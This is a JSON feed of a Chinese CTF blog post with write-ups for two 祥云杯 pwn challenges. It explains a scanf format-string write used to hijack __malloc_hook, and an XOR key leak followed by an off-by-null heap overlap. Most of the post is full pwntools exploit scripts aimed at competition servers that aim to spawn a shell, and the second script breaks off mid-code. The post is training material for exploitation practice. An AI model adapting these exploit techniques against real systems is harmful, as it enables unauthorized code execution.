{
    "version": "https://jsonfeed.org/version/1",
    "title": "-NIYAH- • All posts by \"祥云杯\" tag",
    "description": "Niyah",
    "home_page_url": "http://niyah.cn",
    "items": [
        {
            "id": "http://niyah.cn/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/",
            "url": "http://niyah.cn/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/",
            "title": "祥云杯部分Pwn",
            "date_published": "2021-08-30T14:10:27.000Z",
            "content_html": "<p>再不复现估计都忘了</p>\n<a id=\"more\"></a>\n<h1 id=\"note\"><a class=\"markdownIt-Anchor\" href=\"#note\">#</a> note</h1>\n<p>说实话看到这个格式化字符串漏洞时我反应了挺久的</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/1.png\" alt=\"1\"></p>\n<p>scanf 任意写，通过对 stdout 写入数据来泄露 libc，最后修改__malloc_hook 为 ogg 并通过 realloc 调整栈帧 getshell</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./2021note'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.70.90'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'25315'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'content:'</span><span class=\"token punctuation\">,</span>content<span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'addr: 0x'</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rint\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">say</span><span class=\"token punctuation\">(</span>agr <span class=\"token punctuation\">,</span> text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'say ?'</span><span class=\"token punctuation\">,</span>agr<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'?'</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span>\n\none_gad <span class=\"token operator\">=</span> one_gadget<span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">)</span>\nheap_addr <span class=\"token operator\">=</span> add<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">'aaa'</span><span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0xfbad1800</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span>\nsay<span class=\"token punctuation\">(</span><span class=\"token string\">'%7$s'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\nleak <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n_IO_2_1_stdin_ <span class=\"token operator\">=</span> leak <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">0x7f3038ceb8e0</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x7f3038cea6e0</span><span class=\"token punctuation\">)</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span>_IO_2_1_stdin_ <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">]</span>\nogg <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">+</span> one_gad<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n__malloc_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x8</span>\nrealloc <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'realloc'</span><span class=\"token punctuation\">]</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>__malloc_hook<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># dbg('__isoc99_scanf')</span>\n\nsay<span class=\"token punctuation\">(</span><span class=\"token string\">'%7$saaaa'</span>  <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__malloc_hook<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>ogg<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>realloc <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\ncmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># dbg('malloc')</span>\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'size:'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span>\n\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   2021note.py\n@Time    :   2021/08/21 09:57:32\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"passwordbox_freeversion\"><a class=\"markdownIt-Anchor\" href=\"#passwordbox_freeversion\">#</a> PassWordBox_FreeVersion</h1>\n<p>add 这里有个 offbynull</p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/2.png\" alt=\"1\"></p>\n<p><img src=\"/CTF/%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%83%A8%E5%88%86Pwn/3.png\" alt=\"1\"></p>\n<p>程序会对输入的数据每八字节通过 key 进行异或，第一次 add 会输出加密数据所以第一次 add 的数据为空则会直接输出 key</p>\n<p>之后就是 offbynull 构造堆块重叠了</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\">#context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./pwdFree'</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\">#libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\">#p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',binary])</span>\n    <span class=\"token comment\">#p = process(['qemu-aarch64','-L','',-g,'1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'47.104.71.220'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'38562'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">':'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Input The ID You Want Save:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Length Of Your Pwd:'</span><span class=\"token punctuation\">,</span>size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your Pwd:'</span><span class=\"token punctuation\">,</span>pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Idx you want 2 Delete:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Want Check:'</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">,</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span>\n    se<span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">decode</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> key\n    rst <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        rst <span class=\"token operator\">+=</span> p64<span class=\"token punctuation\">(</span> u64 <span class=\"token punctuation\">(</span> payload<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span>i<span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">^</span> key<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> rst\n\n<span class=\"token comment\"># key 0x0000000000004040</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'Save ID:'</span><span class=\"token punctuation\">)</span>\nkey <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'key'</span><span class=\"token punctuation\">,</span>key<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#6</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">8</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#9</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x6873</span><span class=\"token operator\">^</span>key<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#10</span>\n\n<span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    delete<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span>\ndelete<span 